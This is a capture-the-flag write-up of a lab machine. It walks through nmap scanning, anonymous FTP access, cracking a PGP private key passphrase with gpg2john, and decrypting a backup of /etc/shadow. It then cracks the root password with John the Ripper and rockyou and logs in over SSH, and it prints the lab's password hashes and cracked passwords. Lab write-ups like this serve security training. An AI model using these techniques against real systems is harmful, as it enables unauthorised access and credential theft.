Port scanning
```bash
nmap -p- -min-rate=10000 10.10.203.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 15:02 EEST
Warning: 10.10.203.103 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.203.103
Host is up (0.23s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
3476/tcp  filtered nppmp
4958/tcp  filtered unknown
7246/tcp  filtered unknown
7843/tcp  filtered unknown
16419/tcp filtered unknown
18079/tcp filtered unknown
29562/tcp filtered unknown
30253/tcp filtered unknown
39704/tcp filtered unknown
45807/tcp filtered unknown
46002/tcp filtered unknown
59142/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
```
```bash
nmap -p 21,22,3476,4958 -sC -sV  -min-rate=10000 10.10.203.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 15:05 EEST
Nmap scan report for 10.10.203.103
Host is up (0.32s latency).

PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.25.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Aug 14 04:53 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   87 0        0               0 Aug 14 04:53 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Aug 14 04:53 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Aug 14 04:53 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
3476/tcp closed nppmp
4958/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```
The ftp had anonymous access and in there was the user.txt... quite interesting..

This was quite interesting
```bash
229 Entering Extended Passive Mode (|||40324|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||33546|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |**********************************************************|   524        3.39 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (1.98 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||49260|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |**********************************************************|  3762       49.14 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (14.25 KiB/s)
```
So it was a pgp key and a message of some sort, but it has a password which we can try to crack

```bash
gpg2john private.asc > cracked

File private.asc
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ cat cracked    
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc

xbox360          (anonforce) 
```
The password for the pgp is xbox360
We were able to open the message and it contained the /etc/shadow file
```bash
cat backup    
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7::: 
```
We can try to crack melodias password with hashcat
```bash
hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt
```
I wasn't able to crack the password

I used the tool unshadow that comes with john and was able to crack it
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow 
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)     
1g 0:00:00:00 DONE (2025-08-14 15:59) 2.380g/s 17066p/s 17066c/s 17066C/s horoscope..emoemo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Then we were just able to log in via ssh and get the root flag. This machine was quite interesting since it used alot of hashing and the ftp aspect of it was quite interesting

